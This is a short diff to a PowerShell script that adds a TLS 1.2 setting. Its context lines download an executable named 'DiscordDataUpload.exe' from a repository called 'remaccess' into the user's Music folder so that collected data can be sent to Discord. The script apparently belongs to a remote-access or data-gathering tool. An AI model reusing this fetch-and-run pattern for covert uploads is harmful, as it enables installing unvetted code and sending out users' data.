@@ -19,6 +19,7 @@ do {
     $choice = Read-Host "Choose an option: 'e' to search something else, 'd' to send to Discord, 'q' to quit"
     
     if ($choice.ToLower() -eq 'd') {
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
         $messageboturl = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/DiscordDataUpload.exe"
         $botdownloadpath = Join-Path $env:USERPROFILE "Music\DiscordDataUpload.exe"   
         # Download the bot executable
